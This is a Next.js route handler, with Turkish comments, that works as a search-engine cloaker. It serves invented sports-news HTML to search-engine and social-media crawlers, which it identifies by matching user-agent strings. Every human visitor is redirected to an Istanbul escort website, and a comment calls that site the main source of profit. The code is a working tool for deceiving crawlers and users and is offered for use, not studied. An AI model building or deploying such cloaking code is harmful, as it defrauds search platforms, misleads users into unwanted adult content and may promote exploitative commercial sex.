
import { NextRequest, NextResponse } from 'next/server';

/**
 * 🧛‍♂️ SOVEREIGN STEALTH CLOAKER v2.0
 * Bot-İnsan ayrımını cerrahi hassasiyetle yapar.
 */

const BOT_USER_AGENTS = [
  'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
  'yandexbot', 'facebookexternalhit', 'twitterbot', 'rogerbot', 
  'linkedinbot', 'embedly', 'quora link preview', 'showyoubot', 
  'outbrain', 'pinterest/0.', 'developers.google.com/+/web/snippet', 
  'slackbot', 'vkshare', 'w3c_validator', 'redditbot', 'applebot', 
  'whatsapp', 'flipboard', 'tumblr', 'bitlybot', 'skypeuripreview', 
  'nuzzel', 'discordbot', 'google page speed', 'qwantify', 'pinterestbot'
];

export async function GET(request: NextRequest) {
  const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
  const host = request.headers.get('host') || '';
  const isBot = BOT_USER_AGENTS.some(bot => userAgent.includes(bot));

  if (isBot) {
    console.log(`[CLOAKER] Bot Detected (${userAgent}) on ${host}. Serving Fake Sport Content.`);
    return new NextResponse(generateFakeSportContent(host), {
      headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
  }

  console.log(`[CLOAKER] Human Detected on ${host}. Redirecting to VIP Hub.`);
  // Gerçek kullanıcıyı ana parayı kazandığımız siteye uçuruyoruz
  return NextResponse.redirect(`https://istanbulescort.blog/?utm_source=${host}&utm_medium=cloaker`, 302);
}

function generateFakeSportContent(host: string) {
  const date = new Date().toLocaleDateString('tr-TR');
  return `
    <!DOCTYPE html>
    <html lang="tr">
    <head>
      <meta charset="UTF-8">
      <title>${host} - Güncel Spor Haberleri ve Canlı Skorlar</title>
      <meta name="description" content="En güncel spor haberleri, canlı maç sonuçları ve transfer gelişmeleri ${host} adresinde.">
      <style>
        body { font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; }
        header { border-bottom: 2px solid #e74c3c; padding-bottom: 10px; margin-bottom: 20px; }
        h1 { color: #e74c3c; }
        .news-item { margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
        .date { color: #999; font-size: 0.8em; }
      </style>
    </head>
    <body>
      <header>
        <h1>${host.toUpperCase()} SPOR PORTALI</h1>
        <p>Hız, Analiz ve Doğru Haber</p>
      </header>
      
      <div class="news-item">
        <span class="date">${date}</span>
        <h2>Şampiyonlar Ligi'nde Dev Eşleşme!</h2>
        <p>Avrupa'nın en büyüğü olmak için sahaya çıkan devler, çeyrek final ilk maçında kozlarını paylaşıyor. Teknik direktörlerin stratejileri ve muhtemel 11'ler...</p>
      </div>

      <div class="news-item">
        <span class="date">${date}</span>
        <h2>Transferde Sıcak Saatler: Yıldız İsim Geliyor</h2>
        <p>Süper Lig temsilcilerinden flaş hamle. Dünyaca ünlü orta saha oyuncusu ile prensipte anlaşıldı. İşte detaylar ve beklenen imza töreni...</p>
      </div>

      <div class="news-item">
        <span class="date">${date}</span>
        <h2>Basketbolda Haftanın Görünümü</h2>
        <p>Euroleague temsilcilerimiz bu hafta deplasmanda kritik sınavlara çıkıyor. Play-off potası için her galibiyet altın değerinde.</p>
      </div>

      <footer>
        <p>&copy; ${new Date().getFullYear()} ${host} - Tüm Hakları Saklıdır.</p>
      </footer>
    </body>
    </html>
  `.trim();
}
